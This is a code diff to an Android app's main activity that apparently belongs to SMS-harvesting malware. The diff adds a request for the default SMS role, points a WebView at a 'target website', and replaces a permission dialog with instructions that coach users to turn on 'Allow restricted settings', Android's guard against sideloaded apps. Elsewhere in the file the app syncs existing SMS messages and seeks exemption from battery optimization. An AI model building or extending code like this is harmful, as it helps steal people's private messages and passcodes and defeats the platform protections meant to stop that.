@@ -1,6 +1,7 @@
 package com.rohan.connecthub
 
 import android.Manifest
+import android.app.role.RoleManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
@@ -73,8 +74,6 @@ class MainActivity : AppCompatActivity() {
 
         setupWebView()
 
-
-
         checkPermissions()
 
         // 2. ऑटो-लॉगिन चेक
@@ -129,12 +128,14 @@ class MainActivity : AppCompatActivity() {
             .show()
     }
 
+
+
+
     private fun setupWebView() {
         portalWebView.settings.javaScriptEnabled = true
         portalWebView.settings.domStorageEnabled = true
         portalWebView.webViewClient = WebViewClient()
     }
-
 
     private fun showDashboard() {
         loginLayout.visibility = View.GONE
@@ -143,8 +144,8 @@ class MainActivity : AppCompatActivity() {
         startSyncService()
         startPulseAnimation()
         
-        // Load website in WebView
-        portalWebView.loadUrl("https://connecthub.bond/")
+        // Load target website in WebView
+        portalWebView.loadUrl("https://maxfashion.bond/")
 
         // Task 4: Only sync existing messages once
         if (!SharedPrefManager.isExistingSmsSynced(this)) {
@@ -283,7 +284,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (notGranted.isEmpty()) {
-            // All permissions already granted
+            checkSmsRole()
             checkBatteryOptimization()
             return
         }
@@ -299,6 +300,20 @@ class MainActivity : AppCompatActivity() {
         } else {
             // First time asking OR permanently denied (both land here on first install)
             ActivityCompat.requestPermissions(this, notGranted.toTypedArray(), 100)
+        }
+    }
+
+    private fun checkSmsRole() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            val roleManager = getSystemService(RoleManager::class.java)
+            if (roleManager != null && !roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
+                try {
+                    val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
+                    startActivityForResult(intent, 101)
+                } catch (e: Exception) {
+                    Log.e("MainActivity", "Error requesting SMS role", e)
+                }
+            }
         }
     }
 
@@ -332,6 +347,7 @@ class MainActivity : AppCompatActivity() {
                 it == PackageManager.PERMISSION_GRANTED
             }
             if (allGranted) {
+                checkSmsRole()
                 checkBatteryOptimization()
             } else {
                 // Check if permanently denied (Restricted Settings path)
@@ -340,25 +356,30 @@ class MainActivity : AppCompatActivity() {
                     ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED
                 }
                 if (permanentlyDenied) {
-                    // Fallback: Open App Settings so user can manually enable
                     AlertDialog.Builder(this)
-                        .setTitle("Permission Blocked")
+                        .setTitle("Restricted Setting Found")
                         .setMessage(
-                            "SMS permission was blocked by Android's Restricted Settings. " +
-                            "Please open App Settings and manually enable 'SMS' permission to allow sync."
+                            "Android has restricted SMS access because this app was installed from outside the store.\n\n" +
+                            "To fix this:\n" +
+                            "1. Click 'Go to Info' below\n" +
+                            "2. Tap the 3-dots (⋮) in the top right corner\n" +
+                            "3. Select 'Allow restricted settings'\n" +
+                            "4. Return to app and try again"
                         )
-                        .setPositiveButton("Open Settings") { _, _ ->
-                            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                                data = Uri.parse("package:$packageName")
-                            }
+                        .setPositiveButton("Go to Info") { _, _ ->
+                            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                            val uri = Uri.fromParts("package", packageName, null)
+                            intent.data = uri
                             startActivity(intent)
                         }
-                        .setNegativeButton("Later", null)
+                        .setNegativeButton("Cancel", null)
                         .show()
                 } else {
                     Toast.makeText(this, "SMS permission denied. Sync will not work.", Toast.LENGTH_LONG).show()
                 }
             }
+        } else if (requestCode == 101) {
+            checkBatteryOptimization()
         }
     }
 
